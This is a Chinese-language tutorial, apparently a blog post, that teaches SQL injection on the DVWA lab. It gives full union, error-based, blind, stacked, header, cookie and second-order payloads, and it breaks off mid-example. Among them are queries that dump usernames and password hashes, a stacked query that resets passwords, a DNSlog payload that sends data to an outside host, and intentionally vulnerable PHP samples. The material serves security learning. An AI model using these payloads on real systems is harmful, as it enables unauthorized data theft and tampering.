[{"content":"SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息\n我们可以选择手工注入，也能够选择使用自动化工具sqlmap进行注入\n手工注入 #0 环境配置 使用靶机：DVWA mysql\n将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤\n当用户输入查询内容的时候，$id将会被替换成此内容：\n$query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;; 比如，我们输入1，那么执行的语句就是\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; 那如果我们输入1\u0026rsquo; and 1=1#:\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; and 1=1# \u0026#39; 可以看到，前面的\u0026rsquo;\u0026lsquo;闭合了，后面的\u0026rsquo;被我们注释了，中间的and1=1会被正常执行\n那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！\n#1 union联合查询注入 虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？\n所以，现在我们需要通过一系列的操作，来确定这些东西：\n1.判断是否存在注入，注入是字符型还是数字型\n2.猜测SQL查询语句中的字段数\n3.确定显示的字段顺序\n4.获取当前数据库\n5.获取数据库中的表\n6.获取表中的字段名\n7.显示字段信息\n那么，开始吧！\n常用函数 功能类别 函数/语句 主要数据库 功能描述 注入示例 系统信息查询 database() 或 schema() MySQL 获取当前数据库的名称 ' union select 1,database() # version() 或@@version 通用 获取数据库的详细版本号 ' union select 1,version() # user() 或 current_user() 通用 获取执行查询的数据库用户名 ' union select 1,user() # @@hostname MySQL, MSSQL 获取数据库服务器的主机名 ' union select 1,@@hostname # @@datadir MySQL 获取数据库文件的存储路径 ' union select 1,@@datadir # 数据查询与拼接 group_concat() MySQL, SQLite 将多行结果合并成一个字符串一行显示，用于一次性列出所有表名/列名 ' union select 1,group_concat(table_name) from information_schema.tables # concat() 或 concat_ws() MySQL 将多个字符串或列连接成一个，但是不改变行数，用于拼接用户名和密码等字段 ' union select 1,concat(username,':',password) from users # count() 通用 统计行数 ' union select 1,count(*) from users # substring() 或 limit 通用 截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据 ' and substring(database(),1,1)='a' # 1.判断注入是字符类型or数字型 为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合\n**数字型：**select * from table where id =$id，我们可以直接输入1 and ... 进行执行:\nselect * from table where id =1 and ... **字符型：**select * from table where id=\u0026rsquo;$id\u0026rsquo;我们需要输入1' and ... # ，闭合前后单引号\nselect * from table where id=\u0026#39;1\u0026#39; and ... #\u0026#39; 关于注释：\n\u0026ndash; 是官方的注释，后面必须跟空格\n# 是mysql特有的注释，后面无需跟空格\n有的网站会过滤空格导致\u0026ndash;报错，这时候可以使用\u0026ndash;+，用+代替空格\n以上方法不一定全部适用，需要结合实际情况尝试\n基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：\n测试目的 测试Payload 预期结果 判断数字型 1 and 1=1 页面 正常，与 ?id=1 时相同 1 and 1=2 页面 内容异常 (如变空)，但不是程序或语法报错 判断字符型 1' and '1'='1 页面 正常，与 ?id='1' 时相同 1' and '1'='2 页面 内容异常 (如变空)，但不是程序或语法报错 分别测试是否对应的结果\n还有更加简单（但是不知道是否一定有效的方法）：\n输入2-1，如果是数字型，就会执行2-1运算，id=1；如果是字符型，就会是id=2\n可以构造一个m-n，m是不存在的id，但m-n结果是存在的id，依据结果来判断是字符型还是数字型\n这一点在盲注时比较方便\n通过以上测试，我们知道了现在DVWA的注入类型是字符型\n当然，在写题的时候很有可能你一个也试不出来，因为它是被('')或者\u0026quot;\u0026quot;包裹的，这就需要你凭感觉试了\n不过在此之前，先检查一下你之前的语句有没有写对吧~\n2.猜测SQL查询语句中的字段数（列数） 从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列\n1\u0026#39; or 1=1 order by 1 # 1\u0026#39; or 1=1 order by 2 # 1\u0026#39; or 1=1 order by 3 # //报错了 order by 3的时候报错，说明当前查询的表中只有2列\nand：如果and前为真，执行后面内容\nor：如果前面为假，才执行后面内容\n3.确定显示的字段顺序 虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的\n假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试\n这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）\n之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果\n1\u0026#39; union select 1,2 # 这样就确定了网站执行的SQL语句为：\nselect Firstname,Surname from xx where ID=\u0026#39;id\u0026#39; 从过程中也不难看出，其实确定字段列数和显示顺序可以一起做 从union select 1开始，一直增加select后的位数，直到报错为止\n4.获取当前数据库 知道了回显位，我们就可以把回显位替换成想要的数据\n这里一定要写全，有多少字段，select后面就要有多少相应的字段：\n1\u0026#39; union select 1,database() # database() 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称\n于是，我们就知道了当前数据库名称为dvwa\n5.获取数据库中的表 information_schema.tables表存储了数据表的元数据信息：\n字段名 (Field Name) 描述 (Description) table_schema 记录该表所在的数据库的名称 table_name 记录数据表的名称 engine 记录该表使用的存储引擎，例如 InnoDB, MyISAM table_rows 关于表中总行数的一个粗略估计值 data_length 记录数据表本身的大小（单位：字节） index_length 记录数据表索引的大小（单位：字节） row_format 记录行的格式，例如 Dynamic 或 Compressed，可用于判断表是否被压缩 我们就可以从中得到想要的信息：\n1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 上面的语句效果等同于下面的语句，只不过使用了group_concat()，让输出的内容拼成了一个字符串：\n1\u0026#39; union select 1,table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # 这样就知道了dvwa里面一共有两个表，分别为guestbook和users\n6.获取表中的字段名 information_schema.columns表存储了所有表所有列的元数据信息：\n字段名 描述 COLUMN_NAME 记录列的名称 TABLE_NAME 记录该列所属的数据表的名称 TABLE_SCHEMA 记录该列所属的数据库的名称 ORDINAL_POSITION 记录该列在表中的位置顺序（一个从1开始的数字） DATA_TYPE 记录该列的数据类型，例如 varchar, int, text 等 COLUMN_KEY 记录该列是否为键（索引）。PRI 代表主键, UNI 代表唯一键, MUL 代表可重复的索引 COLUMN_DEFAULT 记录该列的默认值（如果设置了） IS_NULLABLE 记录该列是否允许为 NULL 值 (YES 或 NO)。 CHARACTER_MAXIMUM_LENGTH 记录字符串类型列的最大长度。 同样借此获取users表的字段：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; # 这样就得到了users表的所有的列名称\n7.获取字段信息 知道了表名和列名，就能轻松获取对应信息了\n比如我想获取所有用户的id名称和对应密码：\n1\u0026#39; union select group_concat(user_id,first_name),group_concat(password) from users # 我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2\n8.逐行获取信息 书接上文，如果我只想要显示某一条信息，就可以在末尾加上limit m,n\n意思是从第m条数据开始，显示包括n条数据，比如limit 0,1，就是只显示第1条数据（数据从0开始存储）\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 1,1 # 这里使用limit1,1，就只显示了第二条数据\n#2 报错注入 如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击\n报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”\n报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息\n常用函数 在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数updatexml()和extractvalue()\n当这两个函数在执行时，如果出现xml文档路径错误就会产生报错\nextractvalue (XML_document, XPath_string) 第一个参数：XML_document 是目标XML文档\n第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容\n我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：\n1\u0026#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))# 0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 我们使用了database()函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称\nupdatexml (XML_document, XPath_string, new_value) 第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 第三个参数：new_value 用来替换查找到的符合条件的数据 1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)# 也是同理会报错\n之后的演示我会以updatexml()和extractvalue()为主\n但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇\n不那么常用的函数 floor函数(8.x\u0026gt;mysql\u0026gt;5.0） floor()：对结果取整（向下舍入）\n这不是一个单独使用的函数，而是需要与rand(), count(*)和group by结合使用，来触发主键重复错误：\n(select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ 这里插入你想进行的查询语句，只能有一个返回值，因为concat函数值只接受单值，最好使用limit语句，比如： (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 现在，我们输入这样的注入语句：\n1\u0026#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)# 我们看看每一个部分的作用：\nfloor(rand(0)\\*2)\nrand()函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如0时，它产生的“随机数”序列就变成完全可预测的了\n最终，floor(rand(0)*2)会稳定地产生这样一个序列：0, 1, 1, 0, 1, 1, 0, ...\nconcat((select database()), floor(rand(0)\\*2))\n这部分将我们要查询的数据与上面产生的0或1拼接起来\n因此，它会生成一系列的字符串，如 'dvwa0', 'dvwa1', 'dvwa1', 'dvwa0'\n... from information_schema.tables group by x\nfrom information_schema.tables：这里只是为了提供足够的数据行（至少3行）来让group by操作得以触发错误，任何行数足够的表都可以。\ngroup by x：这是触发错误的关键，它会根据我们上面生成的字符串（如'dvwa0', 'dvwa1'）进行分组和计数。\nselect 1 from ...\n把返回两列的内部查询包装成只返回一列（内容是1）的、语法正确的子查询\n接下来，我们需要知道两个关键点：\n1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值\n2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行\n现在来看看错误是怎样发生的：\n逐行处理：\n第一行：调用rand()，计算出的键是'dvwa0'，临时表中没有这个键，sql准备插入，此时第二次调用rand()，计算出'dvwa1'插入\n（也就是说，想插入的是0，却插入了1）\n第二行：此时rand()第三次被调用，计算出的键是'dvwa1'，临时表中已经有了，不用插入，计数值加一就行\n（注意：sql这里一开始就没有打算插入，而是选择count+1）\n触发错误：\n第三行：此时rand()第四次被调用，计算出的键是'dvwa0'，表里没有这个键，所以sql准备插入，此时第五次调用rand()，计算出'dvwa1'插入\n等等，不对！表里已经有'dvwa1'了！\n这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（Duplicate entry）的错误：**\nDuplicate entry \u0026#39;dvwa1\u0026#39; for key \u0026#39;group_key\u0026#39; 这样，就把数据库名称带了出来\n同时，我们还能总结出这样的规律：\n对于一个整数x通过floor(rand(x)*2)产生的序列：\n如果在未出现0011或1100序列前出现0010或1101，那么该序列可用于报错型sql盲注\n参考文档：SQL报错型盲注教程 ​\t关于floor()报错注入，你真的懂了吗？ ST_LatFromGeoHash(geohash_string) 参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串\n1\u0026#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))# 和XPath_string一样，~不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：\nFUNCTION dvwa.ST_LatFromGeoHash does not exist ↑↑↑↑↑ ST_LongFromGeoHash(geohash_string) 利用原理与ST_LatFromGeoHash完全相同\nST_PointFromGeoHash(geohash_string, srid) 好吧和上面还是一样的\nGTID_SUBSET(subset, set) 第一个参数： subset一个GTID（全局事务标识符）集合。\n第二个参数： set另一个GTID集合。\n一个合法的GTID单元由两部分组成，用冒号隔开：source_id:transaction_id\n当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容\n1\u0026#39; and GTID_SUBSET(database(), 1)# 报错结果：\nFUNCTION dvwa.GTID_SUBSET does not exist 好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！\n爆破数据库名称 1\u0026#39; and extractvalue(1,concat(0x7e,database(),0x7e)) # 1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e),1) # 出现下面报错：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 这就得到了数据库的名称：dvwa\n可能你会有疑惑，为什么要用~包裹内容呢？\n这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看\n爆破表名 由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显\n1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~guestbook~\u0026#39; XPATH syntax error: \u0026#39;~users~\u0026#39; 而如果不用limit语句，则会出现下面的报错：\nSubquery returns more than 1 row 这不是我们想要的，所以limit语句很重要！\n爆破列名 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 3,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 4,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~user~\u0026#39; XPATH syntax error: \u0026#39;~password~\u0026#39; 爆破字段内容 1\u0026#39; and extractvalue(1,concat(0x7e,(select concat_ws(\u0026#39;,\u0026#39;,user,password) from users limit 0,1),0x7e)) # 出现下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327deb\u0026#39; 这里我们使用了concat_ws函数，指定把user和password字段使用,拼接再返回，这样就能实现查询多列\n如果不使用，就会出现下面的报错：\nOperand should contain 1 column(s) 然而，正如上面所说，extractvalue() 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有~看出来**（所以两边都加~是比较明智的选择）**\n所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**substring()函数**\nsubstring(strings,m,n)：从strings的第m个字符开始，向后截取n个字符。 注意：1.substring()的开始位置为1，和limit不一样！ 2.通常substr()可以代替它，用法也相同；而mid()总是可以代替它，因为就是它的别名 substr()=substring()=mid()\n1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 1, 30) from users limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 31, 30) from users limit 0,1),0x7e)) # 分别得到下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327de~\u0026#39; XPATH syntax error: \u0026#39;~b882cf99~\u0026#39; 拼接得到完整的用户名和密码：\nadmin,5f4dcc3b5aa765d61d8327deb882cf99 利用substring()，即使字段长度远远大于32，我们也能一点点凑出完整的内容\n#3 盲注 有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功\n常用函数 函数 用法 mid/substr/substring(string, m, n) 从 m 位置截取string字符串 n 位，初始位置为1，n 可省略 length(string) 返回字符串长度 ord(string) 返回 string 最左面字符的 ASCII 码值 left(string, len) 从左截取 string 的前 len 位 ascii() 将某个字符转换为 ASCII 码值 if(exp1, exp2, exp3) 如果 exp1 正确，就执行 exp2 ，否则执行 exp3 sleep(time) 休眠多少秒 布尔盲注 当我们查询的数据在数据库存在时，就会返回：\nUser ID exists in the database 反之，则会返回：\nUser ID is MISSING from the database 我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真\n猜测长度 使用与(and)：\n1\u0026#39; and length(database())=4 # 使用或(or)：\n\u0026#39; or length(database())=4 # 页面返回exists，说明数据库名称长度为4\n如果库名实在长，也可以使用二分法：\n1\u0026#39; and length(database())\u0026gt;4 # 猜测库名 1\u0026#39; and substring(database(),1,1)=\u0026#39;d\u0026#39; # 如果不想使用''包裹字母，也可以转换成ascii码：\n1\u0026#39; and ascii(substr(database(),1,1))=100 # 一步步尝试，直到尝试出完整的数据库名称\n当然，我们在知道ascii码表的情况下，使用二分法更快：\n1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;64 # 如果substring被过滤了：reverse+left代替substring ​\ttrim代替substring 附上一张ascii码表：\n猜测表的数量 1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39;)=2 # 猜测表2的长度 1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1))=5# 或者把length放在select后面：\n1\u0026#39; and (select length(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1)=5# 猜测表名，字段名等等的步骤都大同小异，在此不过多赘述\n时间盲注 如果页面连exists这样的返回字样都没有怎么办？\n那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间\nsleep延时 利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：\n1\u0026#39; and if(length(database())=4,sleep(5),1)# 注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空\n如果不用if，也是可以的：\n1\u0026#39; and sleep((ascii(substring(database(),1,1))=100)*5)# 页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4\n如果if函数被过滤了：[case when语句代替if](#case when语句代替if)\nbenchmark延时 benchmark(count, exp)：将表达式exp重复执行count次\n只要我们让执行次数够多，就能达到和sleep一样的延迟效果：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(\u0026#39;a\u0026#39;)),1)# 如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒\n笛卡尔积延时 当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)# 这个查询将information_schema.columns这张表自身进行了两次连接，查询起来很费时（大概要两三秒）\n如果感觉延时不够明显，可以多加几次自连接\n正则匹配延时 通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (select rpad(\u0026#39;a\u0026#39;,9999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;)), 1)# 我们来看看其中的正则延时部分是怎么工作的：\nselect rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;) rpad(str,len,padstr)：用字符串padstr对str进行右边填补，直至它的长度达到len，然后返回 str\n​\t如果str的长度长于len，那么它将被截除到len个字符\n(a.*)+：内部的 .* 和外部的 + 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，(a)(a)(a)、(aa)(a)、(a)(aa)等），引擎需要尝试所有这些路径\nb: 在模式末尾加上一个源字符串中不存在的字符'b'，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化\nrepeat(str,times)：字符串str复制times次\n*我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言\u0026gt;\u0026lt;\n参考文章：MySQL时间盲注五种延时方法 时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断\n报错盲注 报错盲注的思想和时间盲注相同，都是利用if函数\n不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断\nsql中存在很多数学计算函数，我们也主要利用他们来实现报错\nexp() exp(x)返回e的x次方，也就是e^x^\n当传递给exp()的参数过大（在MySQL中约大于709）时，会产生数值越界错误\n我们可以通过位运算符~运算0获得一个巨大的整数：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)# 我们知道，~0的结果是64位无符号整数的最大值，远大于709，因此exp()函数执行时必定会溢出报错：\nDOUBLE value is out of range in \u0026#39;exp(~(0))\u0026#39; 你也可以选择手动输入一个很大的数字，比如exp(99999)\n同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：\n1\u0026#39; and exp((ascii(substring(database(),1,1))=100)*99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为exp(1*99999)，也就是exp(99999)，就会报错\ncot() cot()是余切三角函数，而众所周知，cot(0)是不存在的：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)# 也可以不用if函数：\n1\u0026#39; and cot((ascii(substring(database(),1,1))=100)=0)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为cot(1=0)，也就是cot(0)，就会报错\npow() pow(a,b)函数用于求a^b^的值，相信你已经知道怎么做了：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)# 不使用if函数：\n1\u0026#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式就是pow(1+1,99999),也就是2^99999^，就会报错\n#4 堆叠注入 有些应用服务执行sql使用的不是mysqli_query(),而是mysqli_multi_query()方法，可以做到执行多条sql语句\n如果又恰好没有过滤;，我们就能使用;分割语句，利用sql语句进行各种操作：\n1\u0026#39; union select 1,2;update users set password=123 where id=1--+ 这样就篡改了密码，可以随便进入sql啦\n#5 DNSlog注入 DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果\n1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中\n2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求\nDNSLOG注入需要有两个条件：\n目标数据库服务器能够向外网发起DNS请求 开启了LOAD_FILE()读取文件的函数 准备DNSlog平台 网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator\n以dnslog.cn为例，点击Get SubDomain后，我们会得到一个独一无二的子域名，例如：624elh.dnslog.cn： 构造注入Payload 我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是 load_file()：\n1\u0026#39; and load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select database()),\u0026#39;.624elh.dnslog.cn\\\\a\u0026#39;))# 当数据库执行这个Payload时，它会尝试使用load_file()去读取一个网络路径\nconcat()函数会将各部分拼接起来，构造出一个完整的UNC路径：\\\\dvwa.624elh.dnslog.cn\\a\n注意，这里使用的是\\\\，因为需要给\\转义，才能让它被当做普通字符处理\n为了访问这个网络路径，服务器的操作系统必须先解析主机名 dvwa.624elh.dnslog.cn，因此它会向DNS服务器发起一个DNS查询请求\n回到DNSlog，点击Refresh Record，将会显示出dns解析记录\n这样，数据库名'dvwa'就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：\n#6 http请求注入 GET/POST请求注入 完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下\n我们简单句两个例子说明\nGET请求（查询等）：\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; $result = mysqli_query($conn, $sql); ?\u0026gt; 我们一般是在查询输入框中输入注入语句，其实也可以在url中：\nhttp://example.com/get_vuln.php?id=1\u0026#39; UNION SELECT 1, user, password FROM users# id后面其实就是我们之前在输入框中输入的内容\nPOST请求（登录等）：\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE username = \u0026#39;\u0026#34; . $username . \u0026#34;\u0026#39; AND password = \u0026#39;\u0026#34; . $password . \u0026#34;\u0026#39;\u0026#34;; ?\u0026gt; 其实也就是在输入框里填写注入语句就行，也可以抓包后修改\nhttp头部参数注入 http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入\n这里以最常见的User-Agent、Referer、X-Forwarded-For三个字段举例：\n\u0026lt;?php $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; // 获取伪造的客户端IP $user_agent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; // 获取浏览器标识 $referer = $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; // 获取来源页面 // 漏洞点一：根据IP查询该用户是否在黑名单中 $sql_ip = \u0026#34;SELECT * FROM ip_blacklist WHERE ip = \u0026#39;{$ip}\u0026#39;\u0026#34;; $result_ip = mysqli_query($conn, $sql_ip); // 漏洞点二：根据浏览器标识，提供定制化内容 $sql_ua = \u0026#34;SELECT * FROM custom_content WHERE user_agent_key = \u0026#39;{$user_agent}\u0026#39;\u0026#34;; $result_ua = mysqli_query($conn, $sql_ua); // 漏洞点三：记录访问来源 $sql_referer = \u0026#34;SELECT * FROM referer_stats WHERE page_url = \u0026#39;{$referer}\u0026#39;\u0026#34;; $result_referer = mysqli_query($conn, $sql_referer); echo \u0026#34;脚本执行完毕。\u0026#34;; ?\u0026gt; 这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：\nGET /analytics.php HTTP/1.1 Host: vulnerable-site.com User-Agent: Mozilla/5.0\u0026#39; AND (updatexml(1,concat(0x7e,(select database())),1))# X-Forwarded-For: 127.0.0.1\u0026#39; UNION SELECT 1,user,password FROM users# Referer: http://google.com\u0026#39; AND IF(ascii(substring(database(),1,1))\u0026gt;100, sleep(5), 0)# 方式和普通注入都是差不多的，核心思想没变\ncookie注入 从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同\n我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的\n以dvwa靶场high等级的sql盲注为例，我们先看看源码：\n\u0026lt;?php if( isset( $_COOKIE[ \u0026#39;id\u0026#39; ] ) ) { $id = $_COOKIE[ \u0026#39;id\u0026#39; ]; $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39; LIMIT 1;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $getid ); $num = @mysqli_num_rows( $result ); if( $num \u0026gt; 0 ) { echo \u0026#39;\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;\u0026#39;; } else { if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } header( $_SERVER[ \u0026#39;SERVER_PROTOCOL\u0026#39; ] . \u0026#39; 404 Not Found\u0026#39; ); echo \u0026#39;\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;\u0026#39;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); } ?\u0026gt; dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie\n在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样\n我们点击链接更换新cookie：\n1\u0026#39; and length(database())=4 # 刷新页面，页面显示User ID exists in the database.，说明查询成功了，也就是数据库名称长度为4\n值得注意的是，这段代码里还有这样的一段：\nif( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } 页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注\n实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展\nf12开发者工具（应用 -\u0026gt; cookie）：\n浏览器扩展（比如cookie editor）：\n#7 二次注入 二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据\n我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码\n用户注册的php：\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $username_escaped = addslashes($username); $sql = \u0026#34;INSERT INTO users (username, password) VALUES (\u0026#39;{$username_escaped}\u0026#39;, \u0026#39;some_password_hash\u0026#39;)\u0026#34;; mysqli_query($conn, $sql); ?\u0026gt; 开发者使用了addslashes对输入进行转义，过滤了可能的危险语句\n修改密码的php：\n\u0026lt;?php $current_user = $_SESSION[\u0026#39;username\u0026#39;]; $new_password = $_POST[\u0026#39;new_password\u0026#39;]; $sql = \u0026#34;UPDATE users SET password = \u0026#39;{$new_password}\u0026#39; WHERE username = \u0026#39;{$current_user}\u0026#39;\u0026#34;; ?\u0026gt; 开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理\n现在我们注册一个账号，用户名叫：admin'#，假设这个网站管理员账号叫admin，跟我们输入的名称很像吧\n经过注册程序的检查，这个名称没有任何问题，于是放进了数据库\n接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里\n这时，sql语句就变成了：\nUPDATE users SET 